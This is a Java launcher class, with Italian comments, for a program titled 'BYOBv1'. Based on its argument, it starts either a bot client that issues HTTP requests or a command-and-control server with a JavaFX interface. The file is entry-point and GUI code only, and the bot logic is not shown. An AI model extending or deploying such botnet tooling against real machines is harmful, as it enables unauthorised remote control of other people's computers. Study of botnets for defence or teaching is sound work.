package application;
	
import control.client.Bot;
import control.server.BotServer;
import javafx.application.Application;
import javafx.stage.Stage;
import javafx.scene.Scene;
import javafx.scene.layout.VBox;
import javafx.fxml.FXMLLoader;

/**
 * La classe Main è responsabile dell'avvio dell'applicazione
 * Attraverso il metodo main è possibile avviare il Bot oppure il Server C&C
 * sulla base del parametro in ingresso
 */
public class Main extends Application {
	
	public static boolean SERVER;
	
	public static BotServer botServer;
	public static Bot bot;
	
	public static Stage stage;
	public static UserInterfaceController uiController;
	private VBox root;
	private Scene scene;	

	/**
	 * Il metodo main in base al parametro in ingresso avvia il bot oppure 
	 * il serverC&C.
	 * @param args gli unici valori possibili sono "client" o "server"
	 */
	public static void main(String[] args) {
		if(args[0].equals("server")){		
			SERVER = true;		
			botServer = new BotServer();
			botServer.init();
			launch(args); /*avvio dell'interfaccia grafica*/
		}else if (args[0].equals("client")){
			SERVER = false;
			bot = new Bot();		
			bot.init();
			bot.start(); /*avvio delle richieste http*/
		}
	}
	
	/**
	 * Metodo che viene chiamato all'avvio dell'applicazione
	 */
	@Override
	public void start(Stage primaryStage) throws Exception{
		stage = primaryStage;
		FXMLLoader loader = new FXMLLoader(getClass().getResource("user_interface.fxml"));
		root = (VBox)loader.load();
		uiController = loader.getController();
		scene = new Scene(root);
		scene.getStylesheets().add(getClass().getResource("user_interface.css").toExternalForm());
		primaryStage.setTitle("BYOBv1");
		primaryStage.setScene(scene);
		primaryStage.show();
	}
	
	/**
	 * Metodo che viene chiamato alla chiusura dell'applicazione
	 */
	@Override
	public void stop() throws Exception {
		if(SERVER){
			botServer.close();
		}else{
			bot.close();
		}
		super.stop();
	}
	
	public static UserInterfaceController getUiController() {
		return uiController;
	}
}
